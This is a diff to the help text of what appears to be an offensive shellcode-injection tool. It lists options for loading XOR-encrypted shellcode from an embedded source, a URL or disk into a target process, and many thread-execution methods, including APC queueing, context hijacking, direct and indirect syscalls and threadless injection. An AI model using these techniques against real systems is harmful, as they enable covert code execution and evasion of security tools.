@@ -73,7 +73,7 @@ Inject:
         Enter the XorKey to decrypt it with
         Specify a location type where the encrypted shellcode is stored 
             - embedded 0
-            - url https://globetech.biz/hostedShellcode.b64
+            - url https://example.globetech.biz/hostedShellcode.b64
             - disk 'C:\path\to\xord-shellcode.bin'
         Specify the PID
         Optionally specify the Thread Id after the Process ID -- gtinject.exe 100 101 MySecretXorKey embedded 0 10452 1337
@@ -94,15 +94,15 @@ Memory Options
 
 ThreadExec Options
         100. WINAPI  -- CreateRemoteThread
-        101. WINAPI  -- QueueUserAPC, ResumeThread
-        102. WINAPI  -- GetThreadContext, SetThreadContext
+        101. WINAPI  -- QueueUserAPC, ResumeThread - Must Specify Thread ID
+        102. WINAPI  -- GetThreadContext, SetThreadContext - Thread ID Optional
         200. NTAPI   -- NtCreateThreadEx
         201. NTAPI   -- RtlCreateUserThread
-        202. NTAPI   -- NtQueueApcThread, NtResumeThread
+        202. NTAPI   -- NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         300. SysCall -- Direct, NtCreateThreadEx
-        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread
+        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         302. SysCall -- Indirect, NtCreateThreadEx
-        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread
+        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
         400. Novel   -- ThreadlessInject, CreateEventW - does not honor memory option
         401. Novel   -- ThreadlessInject, LoadLibraryExW - does not honor memory option
 
